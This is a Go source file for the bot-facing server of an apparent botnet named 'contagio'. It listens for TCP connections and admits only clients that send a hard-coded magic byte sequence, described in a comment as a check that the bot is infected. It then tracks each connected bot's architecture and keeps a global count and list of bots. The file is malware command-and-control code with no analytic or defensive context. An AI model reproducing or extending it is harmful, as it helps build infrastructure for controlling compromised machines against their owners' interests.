package bot_server

import (
	"bytes"
	"contagio/contagio/config"
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

type Bot struct {
	conn net.Conn
	i    BotInfo
}
type BotInfo struct {
	Arch string
}

var BotCount int
var BotsList sync.Map

func StartBotServer(conf *config.Config) {
	defer catch()

	serv, err := net.Listen("tcp", conf.BotServer)

	if err != nil {
		fmt.Println("[contagio] Bot server fatal error: " + err.Error())
		conf.Wg.Done()
		return
	}

	fmt.Println("[contagio] Bot server ready: " + conf.BotServer)

	for {
		bot, err := serv.Accept()

		if err != nil {
			fmt.Println(err)
		}
		b, inf := initBot(bot)
		if !inf {
			continue
		}

		go b.newbot()

	}

}

func (bot *Bot) newbot() {
	defer catch()

	BotCount++
	go bot.Handle()

	BotsList.Store(bot.conn.RemoteAddr().String(), bot)
}

func (bot *Bot) Handle() {
	defer bot.conn.Close()

	buf := make([]byte, 4096)

	for {
		n, err := bot.conn.Read(buf)
		if err != nil || n == 0 {
			break
		}
		_, err = bot.conn.Write(buf[0:n])
		if err != nil {
			break
		}
		_, err = io.Copy(bot.conn, bot.conn)
		if err != nil {
			break
		}
	}
	BotCount--
	BotsList.Delete(bot.conn.RemoteAddr().String())

}

func initBot(conn net.Conn) (*Bot, bool) {

	defer catch()

	// check if the bot is infected

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	buf := make([]byte, 16)

	conn.Read(buf)

	if !bytes.Equal(buf, []byte{0, 0, 0, 30, 59, 10, 33, 10, 1, 1, 1, 5, 0, 0, 0, 0}) {
		conn.Close()
		return &Bot{}, false
	}

	conn.SetDeadline(time.Now().Add(30 * time.Second))

	buf = make([]byte, 100)

	n, err := conn.Read(buf)
	if err != nil {
		conn.Close()
		return &Bot{}, false
	}

	return &Bot{
		conn: conn,
		i: BotInfo{
			Arch: string(buf[:n]),
		},
	}, true

}
